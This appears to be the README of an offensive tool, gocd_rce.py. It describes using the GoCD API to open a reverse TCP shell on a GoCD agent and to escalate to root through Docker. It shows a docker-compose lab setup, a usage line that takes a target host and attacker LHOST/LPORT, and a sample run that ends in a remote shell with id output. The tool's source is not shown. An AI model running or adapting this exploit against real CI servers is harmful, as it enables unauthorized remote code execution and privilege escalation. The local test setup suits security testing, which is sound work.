# gocd_rce.py

## Summary

Gives you a remote reverse tcp connection on gocd agent by abuse the gocd api.
It also privesc to root by abuse docker if it is present.

## Usage

Start docker container with gocd if you want to test this locally

```sh
 gocd_rce  master ⦿ docker-compose build
goagent uses an image, skipping
Building gocd
Step 1/2 : FROM gocd/gocd-server:v18.6.0
 ---> 3f8e515e3024
Step 2/2 : EXPOSE 8153 8154
 ---> Using cache
 ---> 25e65f538c62
Successfully built 25e65f538c62
Successfully tagged gocdrce_gocd:latest

gocd_rce  master ⦿ docker-compose up -d
Creating gocdrce_goagent_1 ... done
Creating gocdrce_gocd_1    ... done
```

Verify that container is running.

```sh
gocd_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                                COMMAND                  CREATED             STATUS              PORTS               NAMES
4c59edc255b2        gocd/gocd-agent-alpine-3.7:v18.6.0   "/docker-entrypoint.…"   14 seconds ago      Up 13 seconds                           gocdrce_goagent_1
b8dc12861b64        gorce_gocd                           "/docker-entrypoint.…"   13 hours ago        Up 13 hours                             gorce_gocd_1
```

Run ./gocd_rce.py

```sh
gocd_rce  master ⦿ ./gocd_rce.py

  ▄████  ▒█████   ▄████▄  ▓█████▄  ██▀███   ▄████▄  ▓█████
 ██▒ ▀█▒▒██▒  ██▒▒██▀ ▀█  ▒██▀ ██▌▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
▒██░▄▄▄░▒██░  ██▒▒▓█    ▄ ░██   █▌▓██ ░▄█ ▒▒▓█    ▄ ▒███
░▓█  ██▓▒██   ██░▒▓▓▄ ▄██▒░▓█▄   ▌▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
░▒▓███▀▒░ ████▓▒░▒ ▓███▀ ░░▒████▓ ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
 ░▒   ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░ ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
  ░   ░   ░ ▒ ▒░   ░  ▒    ░ ▒  ▒   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
░ ░   ░ ░ ░ ░ ▒  ░         ░ ░  ░   ░░   ░ ░           ░
      ░     ░ ░  ░ ░         ░       ░     ░ ░         ░  ░
                 ░         ░               ░
[mikael.kall@kindredgroup.com]

Usage: ./gocd_rce.py <HOST> <LHOST> <LPORT> [USERNAME] [PASSWORD]

EXAMPLE: ./gocd_rce.py '127.0.0.1' 10.10.14.24 1337 admin password
```        

Run the exploit.

```sh
gocd_rce  master ⦿ ./gocd_rce.py '127.0.0.1' 192.168.1.94 1337
[+] LHOST = 192.168.1.94
[+] LPORT = 1337
[+] Payload
[+] Payload
[+] Exploit
[*] Waiting for agent to schedule payload, note this can take some time..
bash-4.4$ ls
README.md  pop.sh
bash-4.4$ id
uid=1000(go) gid=1000(go) groups=1000(go)
```
